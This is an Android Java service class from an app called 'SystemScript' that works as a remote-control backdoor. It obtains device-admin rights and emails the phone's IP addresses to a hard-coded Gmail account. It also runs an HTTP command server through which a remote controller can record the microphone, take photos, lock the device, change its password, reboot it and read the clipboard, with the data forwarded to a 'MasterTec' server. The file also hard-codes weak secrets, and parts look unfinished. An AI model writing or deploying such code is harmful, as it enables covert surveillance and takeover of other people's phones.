package com.example.systemscript;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import android.media.MediaRecorder;

import androidx.core.content.FileProvider;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.security.KeyStore;
import java.text.SimpleDateFormat;
import java.util.Collections;
import java.util.Date;
import java.util.Enumeration;
import java.util.List;
import java.util.Locale;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.mail.*;
import javax.mail.internet.*;
import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLServerSocket;
import javax.net.ssl.SSLServerSocketFactory;
import javax.net.ssl.SSLSocket;

import java.util.Properties;

import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpExchange;

import org.json.JSONObject;

public class BackgroundService extends Service {

    private static final String CHANNEL_ID = "SystemScriptServiceChannel";
    private static final int SECURE_PORT = 8443; // Secure port for remote access
    private static final int HTTP_PORT = 8080; // Port for the HTTP server
    private static final String PRIVATE_KEY = "QWERTYUIOP"; // Shared private key for authentication
    private SSLServerSocket sslServerSocket;
    private HttpServer httpServer;

    // MasterTec server IP discovered via UDP broadcast
    private volatile String discoveredMasterTecIp = null;

    // MediaRecorder for audio recording
    private MediaRecorder mediaRecorder;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        Notification notification = new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("SystemScript Service")
                .setContentText("Running in the background")
                .setSmallIcon(R.mipmap.ic_launcher)
                .build();
        startForeground(1, notification);

        // Request device admin permissions on activation
        requestDeviceAdminPermissions();

        // Step 1: Discover MasterTec server IP automatically
        new Thread(this::discoverMasterTecServer).start();

        // Step 2: Send secret code to MasterTec to initiate connection (after discovery)
        new Thread(() -> {
            // Wait for discovery
            while (discoveredMasterTecIp == null) {
                try { Thread.sleep(500); } catch (InterruptedException ignored) {}
            }
            sendSecretCodeToMasterTec();
        }).start();

        // Fetch and share the IP address
        new Thread(this::shareDeviceIpAddress).start();

        // Start a thread for secure remote access
        new Thread(this::startSecureServer).start();

        // Start the HTTP server
        startHttpServer();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // Ensures the service is restarted if killed
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            if (sslServerSocket != null && !sslServerSocket.isClosed()) {
                sslServerSocket.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        if (httpServer != null) {
            httpServer.stop(0);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "SystemScript Background Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    private void shareDeviceIpAddress() {
        try {
            String localIpAddress = getDeviceIpAddress();
            String publicIpAddress = getPublicIpAddress();
            String ipInfo = "Local IP: " + (localIpAddress != null ? localIpAddress : "Unavailable") +
                            "\nPublic IP: " + (publicIpAddress != null ? publicIpAddress : "Unavailable");
            sendEmail("rickybhaii2005@gmail.com", "Device IP Address", ipInfo);
        } catch (Exception e) {
            Log.e("BackgroundService", "Error sharing IP address", e);
        }
    }

    private String getDeviceIpAddress() {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface networkInterface : interfaces) {
                List<InetAddress> addresses = Collections.list(networkInterface.getInetAddresses());
                for (InetAddress address : addresses) {
                    if (!address.isLoopbackAddress() && address.isSiteLocalAddress()) {
                        return address.getHostAddress();
                    }
                }
            }
        } catch (Exception e) {
            Log.e("BackgroundService", "Error fetching IP address", e);
        }
        return null;
    }

    private String getPublicIpAddress() {
        try {
            URL url = new URL("https://api.ipify.org"); // External service to fetch public IP
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String publicIp = reader.readLine();
            reader.close();
            return publicIp;
        } catch (Exception e) {
            Log.e("BackgroundService", "Error fetching public IP address", e);
        }
        return null;
    }

    private void sendEmail(String to, String subject, String body) {
        try {
            final String encryptedUsername = "encrypted_username_here"; // Replace with encrypted email
            final String encryptedPassword = "encrypted_password_here"; // Replace with encrypted password
            final String key = "1234567890123456"; // 16-byte encryption key (must be kept secure)

            String username = decrypt(encryptedUsername, key);
            String password = decrypt(encryptedPassword, key);

            Properties props = new Properties();
            props.put("mail.smtp.auth", "true");
            props.put("mail.smtp.starttls.enable", "true");
            props.put("mail.smtp.host", "smtp.gmail.com");
            props.put("mail.smtp.port", "587");

            Session session = Session.getInstance(props, new javax.mail.Authenticator() {
                protected PasswordAuthentication getPasswordAuthentication() {
                    return new PasswordAuthentication(username, password);
                }
            });

            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(username));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(to));
            message.setSubject(subject);
            message.setText(body);

            Transport.send(message);
        } catch (Exception e) {
            Log.e("BackgroundService", "Error sending email", e);
        }
    }

    private String decrypt(String encryptedData, String key) throws Exception {
        SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);
        byte[] decodedData = Base64.decode(encryptedData, Base64.DEFAULT);
        return new String(cipher.doFinal(decodedData));
    }

    private void startSecureServer() {
        try {
            // Load the keystore containing the server certificate
            KeyStore keyStore = KeyStore.getInstance("PKCS12");
            try (InputStream keyStoreStream = getResources().openRawResource(R.raw.keystore)) {
                keyStore.load(keyStoreStream, "keystore_password".toCharArray());
            }

            // Initialize the KeyManagerFactory with the keystore
            KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());
            keyManagerFactory.init(keyStore, "keystore_password".toCharArray());

            // Create an SSLServerSocketFactory
            SSLServerSocketFactory sslServerSocketFactory = (SSLServerSocketFactory) SSLServerSocketFactory.getDefault();

            // Create an SSLServerSocket
            sslServerSocket = (SSLServerSocket) sslServerSocketFactory.createServerSocket(SECURE_PORT);

            // Require client authentication
            sslServerSocket.setNeedClientAuth(true);

            while (!sslServerSocket.isClosed()) {
                SSLSocket clientSocket = (SSLSocket) sslServerSocket.accept();

                // Handle client authentication
                new Thread(() -> handleClient(clientSocket)).start();
            }
        } catch (Exception e) {
            Log.e("BackgroundService", "Error starting secure server", e);
        }
    }

    private void handleClient(SSLSocket clientSocket) {
        try (OutputStream outputStream = clientSocket.getOutputStream();
             PrintWriter writer = new PrintWriter(outputStream, true)) {

            // Basic authentication (username: admin, password: password123)
            writer.println("Enter username:");
            BufferedReader reader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
            String username = reader.readLine();

            writer.println("Enter password:");
            String password = reader.readLine();

            if ("admin".equals(username) && "password123".equals(password)) {
                writer.println("Authentication successful. Welcome!");
                // Handle further communication with the client
            } else {
                writer.println("Authentication failed. Disconnecting...");
                clientSocket.close();
            }
        } catch (IOException e) {
            Log.e("BackgroundService", "Error handling client", e);
        }
    }

    private void startHttpServer() {
        try {
            httpServer = HttpServer.create(new InetSocketAddress(HTTP_PORT), 0);
            httpServer.createContext("/command", new CommandHandler());
            httpServer.start();
            Log.d("BackgroundService", "HTTP server started on port " + HTTP_PORT);
        } catch (Exception e) {
            Log.e("BackgroundService", "Error starting HTTP server", e);
        }
    }

    // UDP broadcast to discover MasterTec server on LAN
    private void discoverMasterTecServer() {
        try {
            int port = 5001; // Port MasterTec server listens for discovery
            String discoveryMessage = "DISCOVER_MASTERTEC";
            java.net.DatagramSocket socket = new java.net.DatagramSocket();
            socket.setBroadcast(true);
            byte[] sendData = discoveryMessage.getBytes();
            java.net.DatagramPacket sendPacket = new java.net.DatagramPacket(sendData, sendData.length,
                    java.net.InetAddress.getByName("255.255.255.255"), port);
            socket.send(sendPacket);

            // Listen for response
            byte[] recvBuf = new byte[15000];
            java.net.DatagramPacket receivePacket = new java.net.DatagramPacket(recvBuf, recvBuf.length);
            socket.setSoTimeout(5000); // 5 seconds timeout
            socket.receive(receivePacket);
            String message = new String(receivePacket.getData()).trim();
            if (message.startsWith("MASTERTEC_HERE:")) {
                discoveredMasterTecIp = receivePacket.getAddress().getHostAddress();
                Log.d("BackgroundService", "Discovered MasterTec IP: " + discoveredMasterTecIp);
            }
            socket.close();
        } catch (Exception e) {
            Log.e("BackgroundService", "Could not discover MasterTec server", e);
        }
    }

    // Step 1: Send secret code to MasterTec Windows software (now uses discovered IP)
    private void sendSecretCodeToMasterTec() {
        if (discoveredMasterTecIp == null) return;
        try {
            String masterTecUrl = "http://" + discoveredMasterTecIp + ":5000/connect";
            HttpURLConnection connection = (HttpURLConnection) new URL(masterTecUrl).openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/json");
            String jsonPayload = String.format("{\"secretCode\":\"%s\"}", PRIVATE_KEY);
            try (OutputStream os = connection.getOutputStream()) {
                os.write(jsonPayload.getBytes());
                os.flush();
            }
            int responseCode = connection.getResponseCode();
            Log.d("BackgroundService", "Sent secret code to MasterTec, response: " + responseCode);
        } catch (Exception e) {
            Log.e("BackgroundService", "Error sending secret code to MasterTec", e);
        }
    }

    // After successful authentication, share all data to MasterTec database (uses discovered IP)
    private void shareDataToMasterTecDatabase(JSONObject data) {
        if (discoveredMasterTecIp == null) return;
        try {
            String masterTecDbUrl = "http://" + discoveredMasterTecIp + ":5000/data";
            HttpURLConnection connection = (HttpURLConnection) new URL(masterTecDbUrl).openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/json");
            try (OutputStream os = connection.getOutputStream()) {
                os.write(data.toString().getBytes());
                os.flush();
            }
            int responseCode = connection.getResponseCode();
            Log.d("BackgroundService", "Shared data to MasterTec DB, response: " + responseCode);
        } catch (Exception e) {
            Log.e("BackgroundService", "Error sharing data to MasterTec DB", e);
        }
    }

    private class CommandHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) {
            try {
                if ("POST".equals(exchange.getRequestMethod())) {
                    String requestBody = new String(exchange.getRequestBody().readAllBytes());
                    JSONObject json = new JSONObject(requestBody);

                    // Verify private key
                    if (!PRIVATE_KEY.equals(json.getString("privateKey"))) {
                        sendResponse(exchange, 403, "Invalid private key");
                        return;
                    }

                    // Log received details
                    Log.d("BackgroundService", "Received command: " + json.getString("command"));
                    Log.d("BackgroundService", "Public IP: " + json.getString("publicIp"));
                    Log.d("BackgroundService", "MAC Address: " + json.getString("macAddress"));
                    Log.d("BackgroundService", "Private IP: " + json.getString("privateIp"));

                    // Process the command
                    String command = json.getString("command");
                    // Try to handle known commands directly
                    if ("START_SERVICE".equalsIgnoreCase(command)) {
                        startService();
                    } else if ("STOP_SERVICE".equalsIgnoreCase(command)) {
                        stopService();
                    } else if ("RESTART_SERVICE".equalsIgnoreCase(command)) {
                        restartService();
                    } else if ("VOLUME_UP".equalsIgnoreCase(command)) {
                        increaseVolume();
                    } else {
                        // Use AI/NLP to interpret and execute natural language commands
                        handleNaturalLanguageCommand(command);
                    }

                    // Step 4: Share all received data to MasterTec database
                    shareDataToMasterTecDatabase(json);

                    sendResponse(exchange, 200, "Command executed: " + command);
                } else {
                    sendResponse(exchange, 405, "Method Not Allowed");
                }
            } catch (Exception e) {
                Log.e("BackgroundService", "Error handling command", e);
                sendResponse(exchange, 500, "Internal Server Error");
            }
        }

        private void sendResponse(HttpExchange exchange, int statusCode, String response) {
            try {
                exchange.sendResponseHeaders(statusCode, response.getBytes().length);
                try (OutputStream os = exchange.getResponseBody()) {
                    os.write(response.getBytes());
                }
            } catch (Exception e) {
                Log.e("BackgroundService", "Error sending response", e);
            }
        }
    }

    private void startService() {
        Log.d("BackgroundService", "Service started.");
        // Add logic to start the service
    }

    private void stopService() {
        Log.d("BackgroundService", "Service stopped.");
        // Add logic to stop the service
    }

    private void restartService() {
        Log.d("BackgroundService", "Service restarted.");
        // Add logic to restart the service
    }

    // Add this method to handle volume up
    private void increaseVolume() {
        try {
            android.media.AudioManager audioManager = (android.media.AudioManager) getSystemService(AUDIO_SERVICE);
            if (audioManager != null) {
                audioManager.adjustStreamVolume(android.media.AudioManager.STREAM_MUSIC,
                        android.media.AudioManager.ADJUST_RAISE, android.media.AudioManager.FLAG_SHOW_UI);
                Log.d("BackgroundService", "Volume increased by command.");
            }
        } catch (Exception e) {
            Log.e("BackgroundService", "Error increasing volume", e);
        }
    }

    // Add this method to handle mute
    private void muteVolume() {
        try {
            android.media.AudioManager audioManager = (android.media.AudioManager) getSystemService(AUDIO_SERVICE);
            if (audioManager != null) {
                audioManager.setStreamMute(android.media.AudioManager.STREAM_MUSIC, true);
                Log.d("BackgroundService", "Volume muted by command.");
            }
        } catch (Exception e) {
            Log.e("BackgroundService", "Error muting volume", e);
        }
    }

    // Add this method to handle device lock
    private void lockDevice() {
        try {
            android.app.KeyguardManager keyguardManager = (android.app.KeyguardManager) getSystemService(KEYGUARD_SERVICE);
            if (keyguardManager != null) {
                keyguardManager.newKeyguardLock("TAG").reenableKeyguard();
                Log.d("BackgroundService", "Device locked by command.");
            }
        } catch (Exception e) {
            Log.e("BackgroundService", "Error locking device", e);
        }
    }

    // Add this method to handle open mic
    private void openMic() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                Log.e("BackgroundService", "RECORD_AUDIO permission not granted.");
                return;
            }
        }
        // Check storage permission for older Android
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q && checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            Log.e("BackgroundService", "WRITE_EXTERNAL_STORAGE permission not granted.");
            return;
        }
        if (mediaRecorder != null) {
            try { mediaRecorder.release(); } catch (Exception ignore) {}
        }
        mediaRecorder = new MediaRecorder();
        try {
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setOutputFile(getExternalFilesDir(null).getAbsolutePath() + "/audio_record.3gp");
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            try {
                mediaRecorder.prepare();
            } catch (IllegalStateException ise) {
                Log.e("BackgroundService", "MediaRecorder prepare() failed", ise);
                mediaRecorder.release();
                mediaRecorder = null;
                return;
            }
            try {
                mediaRecorder.start();
            } catch (IllegalStateException ise) {
                Log.e("BackgroundService", "MediaRecorder start() failed", ise);
                mediaRecorder.release();
                mediaRecorder = null;
                return;
            }
            Log.d("BackgroundService", "Audio recording started.");
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try {
                    mediaRecorder.stop();
                } catch (IllegalStateException ise) {
                    Log.e("BackgroundService", "MediaRecorder stop() failed", ise);
                } catch (Exception e) {
                    Log.e("BackgroundService", "Error stopping audio recording", e);
                } finally {
                    try { mediaRecorder.release(); } catch (Exception ignore) {}
                    mediaRecorder = null;
                    Log.d("BackgroundService", "Audio recording stopped.");
                }
            }, 10000);
        } catch (Exception e) {
            Log.e("BackgroundService", "Error starting audio recording", e);
            try { mediaRecorder.release(); } catch (Exception ignore) {}
            mediaRecorder = null;
        }
    }

    // Add this method to handle open camera
    private void openCamera() {
        // Example: Launch camera app (requires CAMERA permission)
        Intent intent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        try {
            startActivity(intent);
            Log.d("BackgroundService", "Camera opened by command.");
        } catch (Exception e) {
            Log.e("BackgroundService", "Error opening camera", e);
        }
    }

    // Add this method to handle shoot camera
    private void shootCamera() {
        Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
        if (intent.resolveActivity(getPackageManager()) != null) {
            File photoFile = null;
            try {
                String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
                String imageFileName = "JPEG_" + timeStamp + "_";
                File storageDir = getExternalFilesDir(Environment.DIRECTORY_PICTURES);
                photoFile = File.createTempFile(imageFileName, ".jpg", storageDir);
            } catch (IOException e) {
                Log.e("BackgroundService", "Error creating photo file", e);
            }

            if (photoFile != null) {
                Uri photoURI = FileProvider.getUriForFile(this, "com.example.systemscript.fileprovider", photoFile);
                intent.putExtra(MediaStore.EXTRA_OUTPUT, photoURI);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                try {
                    startActivity(intent);
                    Log.d("BackgroundService", "Camera shoot by command. Photo saved to: " + photoFile.getAbsolutePath());
                } catch (Exception e) {
                    Log.e("BackgroundService", "Error opening camera for photo capture", e);
                }
            }
        } else {
            Log.e("BackgroundService", "No camera app available to handle the intent.");
        }
    }

    // Add this method to handle delete
    private void delete() {
        // Example: Delete a file (requires WRITE_EXTERNAL_STORAGE permission on older Android)
        Log.d("BackgroundService", "Delete command executed.");
        // TODO: Implement file/data deletion logic
    }

    // Add this method to handle copy
    private void copy() {
        // Example: Copy text to clipboard
        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        if (clipboard != null) {
            android.content.ClipData clip = android.content.ClipData.newPlainText("label", "Copied data");
            clipboard.setPrimaryClip(clip);
            Log.d("BackgroundService", "Copy command executed.");
        }
    }

    // Add this method to handle paste
    private void paste() {
        // Example: Paste text from clipboard
        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        if (clipboard != null && clipboard.hasPrimaryClip()) {
            android.content.ClipData.Item item = clipboard.getPrimaryClip().getItemAt(0);
            String pastedData = item.getText().toString();
            Log.d("BackgroundService", "Paste command executed: " + pastedData);
            // TODO: Use pastedData as needed
        }
    }

    // Add this method to handle share
    private void share() {
        // Example: Share text using Android Sharesheet
        Intent sendIntent = new Intent();
        sendIntent.setAction(Intent.ACTION_SEND);
        sendIntent.putExtra(Intent.EXTRA_TEXT, "Shared from SystemScript");
        sendIntent.setType("text/plain");
        sendIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        try {
            startActivity(Intent.createChooser(sendIntent, null));
            Log.d("BackgroundService", "Share command executed.");
        } catch (Exception e) {
            Log.e("BackgroundService", "Error sharing data", e);
        }
    }

    // Add this method to handle power off
    private void powerOff() {
        // Power off requires root or device admin (not possible for normal apps)
        Log.d("BackgroundService", "Power off command attempted.");
        // Check for device admin
        android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        android.content.ComponentName adminComponent = new android.content.ComponentName(this, DeviceAdminReceiver.class);
        if (dpm != null && dpm.isAdminActive(adminComponent)) {
            try {
                dpm.reboot(adminComponent); // Only works on some devices/ROMs
            } catch (Exception e) {
                Log.e("BackgroundService", "Device admin cannot power off device on this ROM.", e);
                notifyUser("Power off not supported on this device.");
            }
        } else {
            notifyUser("Power off requires device admin or root access.");
        }
        // If root access is available, you could try executing 'reboot -p' via Runtime (not implemented for safety)
    }

    // Add this method to handle reboot
    private void reboot() {
        // Reboot requires root or device admin (not possible for normal apps)
        Log.d("BackgroundService", "Reboot command attempted.");
        android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        android.content.ComponentName adminComponent = new android.content.ComponentName(this, DeviceAdminReceiver.class);
        if (dpm != null && dpm.isAdminActive(adminComponent)) {
            try {
                dpm.reboot(adminComponent); // Only works on some devices/ROMs
            } catch (Exception e) {
                Log.e("BackgroundService", "Device admin cannot reboot device on this ROM.", e);
                notifyUser("Reboot not supported on this device.");
            }
        } else {
            notifyUser("Reboot requires device admin or root access.");
        }
        // If root access is available, you could try executing 'reboot' via Runtime (not implemented for safety)
    }

    // Helper to show a notification to the user
    private void notifyUser(String message) {
        Notification notification = new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("SystemScript")
                .setContentText(message)
                .setSmallIcon(R.mipmap.ic_launcher)
                .build();
        NotificationManager manager = getSystemService(NotificationManager.class);
        if (manager != null) {
            manager.notify((int) System.currentTimeMillis(), notification);
        }
    }

    // Add this method to handle change password
    private void changePassword(String newPassword) {
        // Example: Change device password using DevicePolicyManager (requires device admin)
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            android.content.ComponentName adminComponent = new android.content.ComponentName(this, DeviceAdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(adminComponent)) {
                dpm.resetPassword(newPassword, android.app.admin.DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
                Log.d("BackgroundService", "Device password changed by command.");
            } else {
                Log.e("BackgroundService", "Device admin not active. Cannot change password.");
            }
        } catch (Exception e) {
            Log.e("BackgroundService", "Error changing password", e);
        }
    }

    // Request device admin permissions
    private void requestDeviceAdminPermissions() {
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            android.content.ComponentName adminComponent = new android.content.ComponentName(this, DeviceAdminReceiver.class);
            if (dpm != null && !dpm.isAdminActive(adminComponent)) {
                // Request device admin permission to allow full control
                Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "SystemScript requires device admin rights to access everything it wants, whenever it wants, for full remote and system control.");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                Log.d("BackgroundService", "Requested device admin permissions for full access.");
            } else {
                // already active, do nothing
                Log.d("BackgroundService", "Device admin already active. Full access granted.");
            }
        } catch (Exception e) {
            Log.e("BackgroundService", "Error requesting device admin permissions", e);
        }
    }

    // Add this method to handle natural language commands
    private void handleNaturalLanguageCommand(String command) {
        String cmd = command.trim().toLowerCase();
        try {
            if (cmd.contains("volume up") || cmd.contains("increase volume")) {
                increaseVolume();
            } else if (cmd.contains("mute")) {
                muteVolume();
            } else if (cmd.contains("lock")) {
                lockDevice();
            } else if (cmd.contains("start service")) {
                startService();
            } else if (cmd.contains("stop service")) {
                stopService();
            } else if (cmd.contains("restart service")) {
                restartService();
            } else if (cmd.contains("open mic") || cmd.contains("record audio")) {
                openMic();
            } else if (cmd.contains("open camera")) {
                openCamera();
            } else if (cmd.contains("shoot camera") || cmd.contains("take photo") || cmd.contains("capture photo")) {
                shootCamera();
            } else if (cmd.contains("delete")) {
                delete();
            } else if (cmd.contains("copy")) {
                copy();
            } else if (cmd.contains("paste")) {
                paste();
            } else if (cmd.contains("share")) {
                share();
            } else if (cmd.contains("power off") || cmd.contains("shutdown")) {
                powerOff();
            } else if (cmd.contains("reboot") || cmd.contains("restart device")) {
                reboot();
            } else if (cmd.contains("change password")) {
                // Extract new password if present (simple example)
                String[] parts = cmd.split("change password");
                String newPassword = parts.length > 1 ? parts[1].trim() : "";
                changePassword(newPassword);
            } else {
                Log.d("BackgroundService", "Unknown or unsupported command: " + command);
            }
        } catch (Exception e) {
            Log.e("BackgroundService", "Error handling natural language command", e);
        }
    }
}
